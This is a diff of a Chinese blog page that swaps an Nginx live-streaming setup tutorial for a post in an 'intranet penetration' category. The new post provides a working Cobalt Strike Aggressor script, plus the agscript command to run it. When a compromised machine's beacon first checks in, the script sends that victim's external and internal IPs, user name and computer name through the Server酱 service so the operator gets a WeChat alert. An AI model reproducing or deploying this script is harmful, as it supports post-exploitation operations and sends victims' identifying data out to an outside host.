@@ -18,17 +18,17 @@
   <link 
     rel="icon" 
     href="/img/favicon.png">
-  <title>搭建Nginx+直播推流平台</title>
+  <title>cs上线提醒-微信端</title>
   
     
       <meta 
         property="og:title" 
-        content="搭建Nginx+直播推流平台">
+        content="cs上线提醒-微信端">
     
     
       <meta 
         property="og:url" 
-        content="https://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/index.html">
+        content="https://www.zerochen.top/article/cs%E4%B8%8A%E7%BA%BF%E6%8F%90%E9%86%92-%E5%BE%AE%E4%BF%A1%E7%AB%AF/index.html">
     
     
       <meta 
@@ -42,10 +42,10 @@
         content="article">
       <meta 
         property="og:article:published_time" 
-        content="2021-06-12">
+        content="2021-10-16">
       <meta 
         property="og:article:modified_time" 
-        content="2021-08-09">
+        content="2021-10-16">
       <meta 
         property="og:article:author" 
         content="沉墨">
@@ -53,11 +53,7 @@
         
           <meta 
             property="og:article:tag" 
-            content="Nginx">
-        
-          <meta 
-            property="og:article:tag" 
-            content="直播推流">
+            content="cs">
         
       
     
@@ -270,30 +266,30 @@
 <article class="card card-content">
   <header>
     <h1 class="post-title">
-      搭建Nginx+直播推流平台
+      cs上线提醒-微信端
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2021-06-12T06:17:16.000Z">
+    <time datetime="2021-10-16T06:50:42.000Z">
       <i 
         class="iconfont icon-calendar" 
         style="margin-right: 2px;">
       </i>
-      <span>2021-06-12</span>
+      <span>2021-10-16</span>
     </time>
     
       <span class="dot"></span>
       
         <a 
-          href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" 
+          href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" 
           class="post-meta-link">
-          环境搭建
+          内网渗透
         </a>
       
     
     
       <span class="dot"></span>
-      <span>599 字</span>
+      <span>409 字</span>
     
   </div>
   
@@ -308,18 +304,9 @@
         
           
           <a 
-            href="/tags/Nginx/" 
+            href="/tags/cs/" 
             class="post-meta-link">
-            Nginx
-          </a>
-        
-          
-            <span class="dot"></span>
-          
-          <a 
-            href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
-            class="post-meta-link">
-            直播推流
+            cs
           </a>
         
       </div>
@@ -329,63 +316,19 @@
   <div 
     id="section" 
     class="post-content">
-    <h1 id="搭建Nginx环境"><a href="#搭建Nginx环境" class="headerlink" title="搭建Nginx环境"></a>搭建Nginx环境</h1><h2 id="1、下载Nginx源码包"><a href="#1、下载Nginx源码包" class="headerlink" title="1、下载Nginx源码包"></a>1、下载Nginx源码包</h2><pre class="highlight"><span class="line">curl http://nginx.org/download/nginx-1.20.1.tar.gz -o nginx-1.20.1.tar.gz</span><br></pre>
+    <p>1、运行脚本(agscript为cs自带脚本)</p>
+<pre class="highlight"><span class="line">./agscript [host] [port] [user] [pass] &lt;/path/to/file.cna&gt;</span><br><span class="line">[host] #服务器的ip地址。</span><br><span class="line">[port] #cs的端口号，启动cs时有显示。</span><br><span class="line">[user] #用户名，用来运行这个脚本的用户名，随便即可。</span><br><span class="line">[pass] #cs的密码，就是启动cs时你设置的密码。</span><br><span class="line">[path] #cna文件的路径。</span><br><span class="line">注意：先启动服务器，再启动脚本</span><br></pre>
 
-<h2 id="2、解压源码包"><a href="#2、解压源码包" class="headerlink" title="2、解压源码包"></a>2、解压源码包</h2><pre class="highlight"><span class="line">tar -zxvf nginx-1.20.1.tar.gz -C ../	# -C指定解压路径</span><br></pre>
 
-<h2 id="3、配置生成文件（一般修改配置文件、日志文件路径）"><a href="#3、配置生成文件（一般修改配置文件、日志文件路径）" class="headerlink" title="3、配置生成文件（一般修改配置文件、日志文件路径）"></a>3、配置生成文件（一般修改配置文件、日志文件路径）</h2><pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module</span><br></pre>
 
-<p>注：需要下载配置环境</p>
-<p>如：</p>
-<pre class="highlight"><span class="line">yum install pcre-devel zlib-devel openssl-devel</span><br></pre>
+<p>代码：</p>
+<pre class="highlight"><span class="line"># 循环获取所有beacon</span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"></span><br><span class="line">    sub http_get &#123;</span><br><span class="line">        local(&#x27;$output&#x27;);</span><br><span class="line">        $url = [new java.net.URL: $1];</span><br><span class="line">        $stream = [$url openStream];</span><br><span class="line">        $handle = [SleepUtils getIOHandle: $stream, $null];</span><br><span class="line"></span><br><span class="line">        @content = readAll($handle);</span><br><span class="line"></span><br><span class="line">        foreach $line (@content) &#123;</span><br><span class="line">            $output .= $line . &quot;\r\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        println($output);</span><br><span class="line">    &#125;</span><br><span class="line">    #获取ip、计算机名、登录账号</span><br><span class="line">    $externalIP = replace(beacon_info($1, &quot;external&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $internalIP = replace(beacon_info($1, &quot;internal&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $userName = replace(beacon_info($1, &quot;user&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $computerName = replace(beacon_info($1, &quot;computer&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line"></span><br><span class="line">    #get一下Server酱的链接</span><br><span class="line">    $url = &#x27;https://sc.ftqq.com/此处填写你Server酱的SCKEY码.send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&amp;desp=%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0A%e5%a4%96%e7%bd%91ip:&#x27;.$externalIP.&#x27;%0D%0A%0D%0A%e5%86%85%e7%bd%91ip:&#x27;.$internalIP.&#x27;%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:&#x27;.$userName.&#x27;%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:&#x27;.$computerName;</span><br><span class="line"></span><br><span class="line">    http_get($url);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
 
-<h2 id="4、make编译"><a href="#4、make编译" class="headerlink" title="4、make编译"></a>4、make编译</h2><h2 id="5、make-install安装"><a href="#5、make-install安装" class="headerlink" title="5、make install安装"></a>5、make install安装</h2><h2 id="6、添加nginx到环境变量"><a href="#6、添加nginx到环境变量" class="headerlink" title="6、添加nginx到环境变量"></a>6、添加nginx到环境变量</h2><pre class="highlight"><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/</span><br></pre>
 
-<p>（注！ /usr/local/nginx/sbin/nginx为nginx启动文件的绝对路径）</p>
-<p>此时可直接使用nginx命令，如：nginx -s stop停止nginx服务</p>
-<h2 id="7、关闭防火墙"><a href="#7、关闭防火墙" class="headerlink" title="7、关闭防火墙"></a>7、关闭防火墙</h2><pre class="highlight"><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">systemctl disable firewalld		#永久禁用</span><br></pre>
 
-<p>至此，访问80端口可看到Nginx测试页</p>
-<p>下载任意html静态网站压缩包，解压并复制到Nginx网站路径，即可访问静态网页</p>
-<h2 id="8、其他注意事项"><a href="#8、其他注意事项" class="headerlink" title="8、其他注意事项"></a>8、其他注意事项</h2><pre class="highlight"><span class="line">/var/lib/mysql				# mysql数据路径</span><br><span class="line">/usr/local/nginx/html		# Nginx默认网站路径</span><br><span class="line">/etc/nginx/nginx.conf		# Nginx配置文件</span><br></pre>
-
-<p>修改root /var/www/html即可改变默认路径</p>
-<p><a href="http://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png"><img src="http://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png" class="lozad post-image"></a></p>
-<h1 id="Nginx搭建直播推流平台"><a href="#Nginx搭建直播推流平台" class="headerlink" title="Nginx搭建直播推流平台"></a>Nginx搭建直播推流平台</h1><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p>nginx-http-flv-module-master.zip + OBS Studio（pc端）/杏林推流（app端）</p>
-<h2 id="1、源码安装，配置"><a href="#1、源码安装，配置" class="headerlink" title="1、源码安装，配置"></a>1、源码安装，配置</h2><p>在nginx源码编译基础上，增加–add-module=/home/chen/software/nginx-http-flv-module-master（导入为绝对路径），即：</p>
-<pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module --add-module=/home/chen/software/nginx-http-flv-module-master</span><br></pre>
-
-<h2 id="2、make、make-install"><a href="#2、make、make-install" class="headerlink" title="2、make、make install"></a>2、make、make install</h2><h2 id="3、修改配置文件"><a href="#3、修改配置文件" class="headerlink" title="3、修改配置文件"></a>3、修改配置文件</h2><p>（/etc/nginx/nginx.conf）</p>
-<p>在http中新增（与最内层函数同级）</p>
-<pre class="highlight"><span class="line">location /live &#123;</span><br><span class="line"></span><br><span class="line">  flv_live on;</span><br><span class="line"></span><br><span class="line">  chunked_transfer_encoding on;</span><br><span class="line"></span><br><span class="line">  add_header Access-Control-Allow-Origin *;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
-
-<p>在文件末尾新增（与http函数同级）</p>
-<pre class="highlight"><span class="line">rtmp &#123;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line"></span><br><span class="line">		listen 1935;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">		application chen &#123;</span><br><span class="line"></span><br><span class="line">			live on;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
-
-<p>（注！live不可更改，会导致无法加载视频）</p>
-<h2 id="4、检查"><a href="#4、检查" class="headerlink" title="4、检查"></a>4、检查</h2><pre class="highlight"><span class="line">nginx -t		# 检测配置文件有无语法错误</span><br><span class="line">nginx -s reload	# 重新加载</span><br></pre>
-
-<h2 id="5、推流设置"><a href="#5、推流设置" class="headerlink" title="5、推流设置"></a>5、推流设置</h2><p>OBS推流设置（PC）</p>
-<table>
-<thead>
-<tr>
-<th align="left">说明</th>
-<th align="left">命令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">服务器</td>
-<td align="left">rtmp://139.224.x.x/live/</td>
-</tr>
-<tr>
-<td align="left">串流密钥</td>
-<td align="left">chen（可更改，类似于密码）</td>
-</tr>
-</tbody></table>
-<p>杏林推流设置（APP）</p>
-<pre class="highlight"><span class="line">rtmp://139.224.x.x/live/chen</span><br></pre>
-
-<h2 id="6、观看"><a href="#6、观看" class="headerlink" title="6、观看"></a>6、观看</h2><pre class="highlight"><span class="line">http://bilibili.github.io/flv.js/demo/			#观看视频地址</span><br><span class="line">http://139.224.x.x/live?app=live&amp;stream=chen	#推流视频链接</span><br></pre>
+<p>2、</p>
+<p>server酱连接，内置企业微信或公众号提醒教程。公众号提醒默认设置，直接使用；企业微信自行看server酱教程。</p>
+<pre class="highlight"><span class="line">https://sct.ftqq.com/sendkey</span><br></pre>
 
   </div>
   <div>
@@ -405,8 +348,8 @@
           <span style="font-weight: bold;">文章链接：</span><a 
             target="_blank" 
             rel="nofollow noopener noreferrer" 
-            href="https://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/">
-            https://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/
+            href="https://www.zerochen.top/article/cs%E4%B8%8A%E7%BA%BF%E6%8F%90%E9%86%92-%E5%BE%AE%E4%BF%A1%E7%AB%AF/">
+            https://www.zerochen.top/article/cs%E4%B8%8A%E7%BA%BF%E6%8F%90%E9%86%92-%E5%BE%AE%E4%BF%A1%E7%AB%AF/
           </a>
         </p>
         <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
@@ -416,29 +359,15 @@
 </article>
 <div class="nav">
   
-    <div class="nav-item-prev">
-      <a 
-        href="/article/HTML%E3%80%81CSS%E5%9F%BA%E7%A1%80/" 
-        class="nav-link">
-        <i class="iconfont icon-left nav-prev-icon"></i>
-        <div>
-          <div class="nav-label">上一篇</div>
-          
-            <div class="nav-title">HTML、CSS基础 </div>
-          
-        </div>
-      </a>
-    </div>
-  
   
     <div class="nav-item-next">
       <a 
-        href="/article/Linux%E9%9A%8F%E8%AE%B0/" 
+        href="/article/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" 
         class="nav-link">
         <div>
           <div class="nav-label">下一篇</div>
           
-            <div class="nav-title">Linux随记 </div>
+            <div class="nav-title">域内信息收集 </div>
           
         </div>
         <i class="iconfont icon-right nav-next-icon"></i>
@@ -492,7 +421,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%90%AD%E5%BB%BANginx%E7%8E%AF%E5%A2%83"><span class="toc-text">搭建Nginx环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%B8%8B%E8%BD%BDNginx%E6%BA%90%E7%A0%81%E5%8C%85"><span class="toc-text">1、下载Nginx源码包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E8%A7%A3%E5%8E%8B%E6%BA%90%E7%A0%81%E5%8C%85"><span class="toc-text">2、解压源码包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E9%85%8D%E7%BD%AE%E7%94%9F%E6%88%90%E6%96%87%E4%BB%B6%EF%BC%88%E4%B8%80%E8%88%AC%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E3%80%81%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%EF%BC%89"><span class="toc-text">3、配置生成文件（一般修改配置文件、日志文件路径）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81make%E7%BC%96%E8%AF%91"><span class="toc-text">4、make编译</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81make-install%E5%AE%89%E8%A3%85"><span class="toc-text">5、make install安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E6%B7%BB%E5%8A%A0nginx%E5%88%B0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">6、添加nginx到环境变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-text">7、关闭防火墙</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E5%85%B6%E4%BB%96%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">8、其他注意事项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nginx%E6%90%AD%E5%BB%BA%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0"><span class="toc-text">Nginx搭建直播推流平台</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="toc-text">工具：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%EF%BC%8C%E9%85%8D%E7%BD%AE"><span class="toc-text">1、源码安装，配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81make%E3%80%81make-install"><span class="toc-text">2、make、make install</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">3、修改配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%A3%80%E6%9F%A5"><span class="toc-text">4、检查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E6%8E%A8%E6%B5%81%E8%AE%BE%E7%BD%AE"><span class="toc-text">5、推流设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E8%A7%82%E7%9C%8B"><span class="toc-text">6、观看</span></a></li></ol></li></ol>
+
 </div></main>
             <aside class="left-column">
               
@@ -538,7 +467,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%90%AD%E5%BB%BANginx%E7%8E%AF%E5%A2%83"><span class="toc-text">搭建Nginx环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%B8%8B%E8%BD%BDNginx%E6%BA%90%E7%A0%81%E5%8C%85"><span class="toc-text">1、下载Nginx源码包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E8%A7%A3%E5%8E%8B%E6%BA%90%E7%A0%81%E5%8C%85"><span class="toc-text">2、解压源码包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E9%85%8D%E7%BD%AE%E7%94%9F%E6%88%90%E6%96%87%E4%BB%B6%EF%BC%88%E4%B8%80%E8%88%AC%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E3%80%81%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%EF%BC%89"><span class="toc-text">3、配置生成文件（一般修改配置文件、日志文件路径）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81make%E7%BC%96%E8%AF%91"><span class="toc-text">4、make编译</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81make-install%E5%AE%89%E8%A3%85"><span class="toc-text">5、make install安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E6%B7%BB%E5%8A%A0nginx%E5%88%B0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">6、添加nginx到环境变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-text">7、关闭防火墙</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E5%85%B6%E4%BB%96%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">8、其他注意事项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nginx%E6%90%AD%E5%BB%BA%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0"><span class="toc-text">Nginx搭建直播推流平台</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="toc-text">工具：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%EF%BC%8C%E9%85%8D%E7%BD%AE"><span class="toc-text">1、源码安装，配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81make%E3%80%81make-install"><span class="toc-text">2、make、make install</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">3、修改配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%A3%80%E6%9F%A5"><span class="toc-text">4、检查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E6%8E%A8%E6%B5%81%E8%AE%BE%E7%BD%AE"><span class="toc-text">5、推流设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E8%A7%82%E7%9C%8B"><span class="toc-text">6、观看</span></a></li></ol></li></ol>
+
       </div>
     </article>
   
@@ -758,7 +687,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%90%AD%E5%BB%BANginx%E7%8E%AF%E5%A2%83"><span class="toc-text">搭建Nginx环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%B8%8B%E8%BD%BDNginx%E6%BA%90%E7%A0%81%E5%8C%85"><span class="toc-text">1、下载Nginx源码包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E8%A7%A3%E5%8E%8B%E6%BA%90%E7%A0%81%E5%8C%85"><span class="toc-text">2、解压源码包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E9%85%8D%E7%BD%AE%E7%94%9F%E6%88%90%E6%96%87%E4%BB%B6%EF%BC%88%E4%B8%80%E8%88%AC%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E3%80%81%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%EF%BC%89"><span class="toc-text">3、配置生成文件（一般修改配置文件、日志文件路径）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81make%E7%BC%96%E8%AF%91"><span class="toc-text">4、make编译</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81make-install%E5%AE%89%E8%A3%85"><span class="toc-text">5、make install安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E6%B7%BB%E5%8A%A0nginx%E5%88%B0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">6、添加nginx到环境变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-text">7、关闭防火墙</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E5%85%B6%E4%BB%96%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">8、其他注意事项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nginx%E6%90%AD%E5%BB%BA%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0"><span class="toc-text">Nginx搭建直播推流平台</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="toc-text">工具：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%EF%BC%8C%E9%85%8D%E7%BD%AE"><span class="toc-text">1、源码安装，配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81make%E3%80%81make-install"><span class="toc-text">2、make、make install</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">3、修改配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%A3%80%E6%9F%A5"><span class="toc-text">4、检查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E6%8E%A8%E6%B5%81%E8%AE%BE%E7%BD%AE"><span class="toc-text">5、推流设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E8%A7%82%E7%9C%8B"><span class="toc-text">6、观看</span></a></li></ol></li></ol>
+
     </article>
   
   
